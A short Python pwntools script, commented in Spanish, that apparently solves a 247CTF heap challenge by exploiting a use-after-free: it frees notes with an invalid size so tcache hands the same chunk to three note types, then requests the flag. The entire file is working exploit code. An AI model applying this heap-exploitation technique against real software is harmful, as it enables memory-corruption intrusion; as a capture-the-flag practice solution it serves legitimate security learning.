#!/usr/bin/env python3
from pwn import *

HOST = "ac2fa19be07066e7.247ctf.com"
PORT = 50069

def exploit():
    io = remote(HOST, PORT)
    
    # 1. Crear nota small con tamaño válido
    io.sendlineafter(b"command:", b"small")
    io.sendlineafter(b"note:", b"24")
    io.sendlineafter(b"data:", b"AAAA")
    
    # 2. Liberar small con tamaño inválido (puntero no se limpia)
    io.sendlineafter(b"command:", b"small")
    io.sendlineafter(b"note:", b"0")
    
    # 3. Crear nota medium - tcache devuelve la misma dirección
    io.sendlineafter(b"command:", b"medium")
    io.sendlineafter(b"note:", b"24")
    io.sendlineafter(b"data:", b"BBBB")
    
    # 4. Liberar medium con tamaño inválido
    io.sendlineafter(b"command:", b"medium")
    io.sendlineafter(b"note:", b"0")
    
    # 5. Crear nota large - tcache devuelve la misma dirección
    io.sendlineafter(b"command:", b"large")
    io.sendlineafter(b"note:", b"24")
    io.sendlineafter(b"data:", b"CCCC")
    
    # 6. Obtener flag - los 3 punteros apuntan a la misma dirección
    io.sendlineafter(b"command:", b"flag")
    
    # Recibir respuesta
    response = io.recvall(timeout=3)
    print(response.decode(errors='ignore'))
    io.close()

if __name__ == "__main__":
    exploit()
